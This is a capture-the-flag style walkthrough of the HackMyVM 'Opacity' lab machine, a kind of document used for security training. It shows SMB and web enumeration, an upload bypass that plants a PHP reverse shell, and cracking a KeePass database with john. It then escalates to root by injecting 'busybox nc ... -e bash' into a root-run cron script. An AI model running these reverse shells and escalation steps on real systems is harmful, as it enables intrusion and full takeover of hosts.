---
layout: post
title: "HackMyVM - Opacity"
date: 2022-12-27 15:47:00 +0100
categories: hmv
tag: ["RCE"]
---

Creator: [mindsflee](https://hackmyvm.eu/profile/?user=mindsflee)
Level: Medium
Release Date: 2022-12-21

## Scan

```bash
$ nmap -sV -sC -oA scans/Opacity 192.168.1.10
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-27 01:36 WEST
Nmap scan report for 192.168.1.10
Host is up (0.00053s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 0fee2910d98e8c53e64de3670c6ebee3 (RSA)
|   256 9542cdfc712799392d0049ad1be4cf0e (ECDSA)
|_  256 edfe9c94ca9c086ff25ca6cf4d3c8e5b (ED25519)
80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-title: Login
|_Requested resource was login.php
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
|_clock-skew: 1s
|_nbstat: NetBIOS name: OPACITY, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| smb2-time: 
|   date: 2023-04-13T00:37:05
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.42 seconds
```

## Enumeration

### SMB

```bash
$ enum4linux 192.168.1.10                        
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu Dec 27 06:52:30 2022

 =========================================( Target Information )=========================================

Target ........... 192.168.1.10
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ============================( Enumerating Workgroup/Domain on 192.168.1.10 )============================


[+] Got domain/workgroup name: WORKGROUP


 ================================( Nbtstat Information for 192.168.1.10 )================================

Looking up status of 192.168.1.10
        OPACITY         <00> -         B <ACTIVE>  Workstation Service
        OPACITY         <03> -         B <ACTIVE>  Messenger Service
        OPACITY         <20> -         B <ACTIVE>  File Server Service
        WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
        WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

        MAC Address = 00-00-00-00-00-00

 ===================================( Session Check on 192.168.1.10 )===================================
                                                                                                                                                                       
                                                                                                                                                                       
[+] Server 192.168.1.10 allows sessions using username '', password ''                                                                                                 
                                                                                                                                                                       
                                                                                                                                                                       
 ================================( Getting domain SID for 192.168.1.10 )================================
                                                                                                                                                                       
Domain Name: WORKGROUP                                                                                                                                                 
Domain Sid: (NULL SID)

[+] Can't determine if host is part of domain or part of a workgroup                                                                                                   
                                                                                                                                                                       
                                                                                                                                                                       
 ===================================( OS information on 192.168.1.10 )===================================
                                                                                                                                                                       
                                                                                                                                                                       
[E] Can't get OS info with smbclient                                                                                                                                   
                                                                                                                                                                       
                                                                                                                                                                       
[+] Got OS info for 192.168.1.10 from srvinfo:                                                                                                                         
        OPACITY        Wk Sv PrQ Unx NT SNT opacity server (Samba, Ubuntu)                                                                                             
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03


 =======================================( Users on 192.168.1.10 )=======================================
                                                                                                                                                                       
Use of uninitialized value $users in print at ./enum4linux.pl line 972.                                                                                                
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 975.

Use of uninitialized value $users in print at ./enum4linux.pl line 986.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 988.

 =================================( Share Enumeration on 192.168.1.10 )=================================
                                                                                                                                                                       
smbXcli_negprot_smb1_done: No compatible protocol selected by server.                                                                                                  

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (opacity server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.
protocol negotiation failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 192.168.1.10                                                                                                                           
                                                                                                                                                                       
//192.168.1.10/print$   Mapping: DENIED Listing: N/A Writing: N/A                                                                                                      

[E] Can't understand response:                                                                                                                                         
                                                                                                                                                                       
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*                                                                                                                             
//192.168.1.10/IPC$     Mapping: N/A Listing: N/A Writing: N/A

 ============================( Password Policy Information for 192.168.1.10 )============================
                                                                                                                                                                       
                                                                                                                                                                       

[+] Attaching to 192.168.1.10 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

        [+] OPACITY
        [+] Builtin

[+] Password Info for Domain: OPACITY

        [+] Minimum password length: 5
        [+] Password history length: None
        [+] Maximum password age: 37 days 6 hours 21 minutes 
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: None
        [+] Reset Account Lockout Counter: 30 minutes 
        [+] Locked Account Duration: 30 minutes 
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: 37 days 6 hours 21 minutes 



[+] Retieved partial password policy with rpcclient:                                                                                                                   
                                                                                                                                                                       
                                                                                                                                                                       
Password Complexity: Disabled                                                                                                                                          
Minimum Password Length: 5


 =======================================( Groups on 192.168.1.10 )=======================================
                                                                                                                                                                       
                                                                                                                                                                       
[+] Getting builtin groups:                                                                                                                                            
                                                                                                                                                                       
                                                                                                                                                                       
[+]  Getting builtin group memberships:                                                                                                                                
                                                                                                                                                                       
                                                                                                                                                                       
[+]  Getting local groups:                                                                                                                                             
                                                                                                                                                                       
                                                                                                                                                                       
[+]  Getting local group memberships:                                                                                                                                  
                                                                                                                                                                       
                                                                                                                                                                       
[+]  Getting domain groups:                                                                                                                                            
                                                                                                                                                                       
                                                                                                                                                                       
[+]  Getting domain group memberships:                                                                                                                                 
                                                                                                                                                                       
                                                                                                                                                                       
 ==================( Users on 192.168.1.10 via RID cycling (RIDS: 500-550,1000-1050) )==================
                                                                                                                                                                       
                                                                                                                                                                       
[I] Found new SID:                                                                                                                                                     
S-1-22-1                                                                                                                                                               

[I] Found new SID:                                                                                                                                                     
S-1-5-32                                                                                                                                                               

[I] Found new SID:                                                                                                                                                     
S-1-5-32                                                                                                                                                               

[I] Found new SID:                                                                                                                                                     
S-1-5-32                                                                                                                                                               

[I] Found new SID:                                                                                                                                                     
S-1-5-32                                                                                                                                                               

[+] Enumerating users using SID S-1-5-32 and logon username '', password ''                                                                                            
                                                                                                                                                                       
S-1-5-32-544 BUILTIN\Administrators (Local Group)                                                                                                                      
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)

[+] Enumerating users using SID S-1-5-21-1327801453-43412457-3647261475 and logon username '', password ''                                                             
                                                                                                                                                                       
S-1-5-21-1327801453-43412457-3647261475-501 OPACITY\nobody (Local User)                                                                                                
S-1-5-21-1327801453-43412457-3647261475-513 OPACITY\None (Domain Group)

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''                                                                                            
                                                                                                                                                                       
S-1-22-1-1000 Unix User\sysadmin (Local User)                                                                                                                          

 ===============================( Getting printer info for 192.168.1.10 )===============================
                                                                                                                                                                       
No printers returned.                                                                                                                                                  
```

### Webserver Directories/Files

```bash
$ gobuster dir -u http://192.168.1.10 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.10
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              html,txt,php
[+] Timeout:                 10s
===============================================================
2022/12/27 06:58:09 Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 277]
/.html                (Status: 403) [Size: 277]
/login.php            (Status: 200) [Size: 848]
/index.php            (Status: 302) [Size: 0] [--> login.php]
/css                  (Status: 301) [Size: 310] [--> http://192.168.1.10/css/]
/logout.php           (Status: 302) [Size: 0] [--> login.php]
/cloud                (Status: 301) [Size: 312] [--> http://192.168.1.10/cloud/]
/.html                (Status: 403) [Size: 277]
/.php                 (Status: 403) [Size: 277]
/server-status        (Status: 403) [Size: 277]
Progress: 881902 / 882244 (99.96%)
===============================================================
2022/12/27 07:02:49 Finished
===============================================================
```

### Webserver (/cloud/) 

```bash
$ gobuster dir -u http://192.168.1.10/cloud/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.10/cloud/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
2022/12/27 07:03:52 Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 277]
/images               (Status: 301) [Size: 319] [--> http://192.168.1.10/cloud/images/]
/index.php            (Status: 200) [Size: 648]
/.html                (Status: 403) [Size: 277]
/storage.php          (Status: 200) [Size: 760]
/.php                 (Status: 403) [Size: 277]
/.html                (Status: 403) [Size: 277]
===============================================================
2022/12/27 07:12:49 Finished
===============================================================
```

## File Upload Bypass (#.png)

<img src="https://drive.google.com/uc?id=1kKktKD-eGjQHuRRJjvIuS0_3IDdPadzB"/>

http://192.168.1.10/cloud/images/rshell.php#.png

<img src="https://drive.google.com/uc?id=1StpL9e9t1biGxBy3fqlPwKY0IXkp-pbH"/>

## Reverse Shell

```bash
$ sudo pwncat-cs --listen --port 4444
[sudo] password for adok: 
/usr/local/lib/python3.11/dist-packages/paramiko/transport.py:178: CryptographyDeprecationWarning: Blowfish has been deprecated
  'class': algorithms.Blowfish,
[07:09:59] Welcome to pwncat 🐈!                                                                                                                        __main__.py:164
[07:11:07] received connection from 192.168.1.10:43058                                                                                                       bind.py:84
[07:11:07] 0.0.0.0:4444: upgrading from /usr/bin/dash to /usr/bin/bash                                                                                   manager.py:957
[07:11:08] 192.168.1.10:43058: registered new host w/ db                                                                                                 manager.py:957
(local) pwncat$
```

### Finding Users

```bash
(remote) www-data@opacity:/var/www/html/cloud$ ls /home
sysadmin
(remote) www-data@opacity:/var/www/html/cloud$ find / -user sysadmin  2> /dev/null
/opt/dataset.kdbx
/home/sysadmin
/home/sysadmin/snap
/home/sysadmin/.sudo_as_admin_successful
/home/sysadmin/.ssh
/home/sysadmin/.bash_history
/home/sysadmin/scripts/lib
/home/sysadmin/local.txt
/home/sysadmin/.bashrc
/home/sysadmin/.cache
/home/sysadmin/.gnupg
/home/sysadmin/.bash_logout
/home/sysadmin/.profile
(remote) www-data@opacity:/var/www/html/cloud$
```

## KeePass Database

```bash
(remote) www-data@opacity:/var/www/html/cloud$ cd /opt
(remote) www-data@opacity:/opt$ 
(local) pwncat$ download dataset.kdbx
dataset.kdbx ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100.0% • 1.6/1.6 KB • ? • 0:00:00
[07:20:44] downloaded 1.57KiB in 0.15 seconds                                                                                                            download.py:71
(local) pwncat$                                                                                                                                                        
(remote) www-data@opacity:/opt$ 
```

### Cracking KeePass Password

```bash
$ keepass2john dataset.kdbx > hash

$ john --wordlist=/usr/share/wordlists/rockyou.txt hash                            
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 100000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
741852963        (dataset)     
1g 0:00:00:22 DONE (2022-12-27 18:31) 0.04416g/s 38.86p/s 38.86c/s 38.86C/s chichi..david1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

### KeeWeb Login

<img src="https://drive.google.com/uc?id=1emoVSpclDBay6BEWkBy7S8ilsZ4oDrO8"/>

## ROOT

```bash
$ ssh sysadmin@10.10.189.83         
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-139-generic x86_64)

Last login: Wed Dec 22 08:13:43 2022 from 10.0.2.15
sysadmin@opacity:~$ 
```

### PSPY64

```bash
2022-12-27 17:30:01 CMD: UID=0    PID=25749  | /usr/bin/php /home/sysadmin/scripts/script.php 
```

```php
<?php                                                                                                                                                                  
//Backup of scripts sysadmin folder
require_once('lib/backup.inc.php');
zipData('/home/sysadmin/scripts', '/var/backups/backup.zip');
echo 'Successful', PHP_EOL;

//Files scheduled removal
$dir = "/var/www/html/cloud/images";
if(file_exists($dir)){
    $di = new RecursiveDirectoryIterator($dir, FilesystemIterator::SKIP_DOTS);
    $ri = new RecursiveIteratorIterator($di, RecursiveIteratorIterator::CHILD_FIRST);
    foreach ( $ri as $file ) {
        $file->isDir() ?  rmdir($file) : unlink($file);
    }
}
?>
```

### PHP Reverse shell (backup.inc.php)

```php
<?php
ini_set('max_execution_time', 600);
ini_set('memory_limit', '1024M');

function zipData($source, $destination) {
        system('/usr/bin/busybox nc 192.168.1.6 4444 -e bash');
}
?>
```

```bash
sysadmin@opacity:~$ mv backup.inc.php scripts/lib/
mv: replace 'scripts/lib/backup.inc.php', overriding mode 0644 (rw-r--r--)? y
sysadmin@opacity:~$ 
```

```bash
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.1.6] from (UNKNOWN) [192.168.1.10] 43070
id
uid=0(root) gid=0(root) groups=0(root)
```
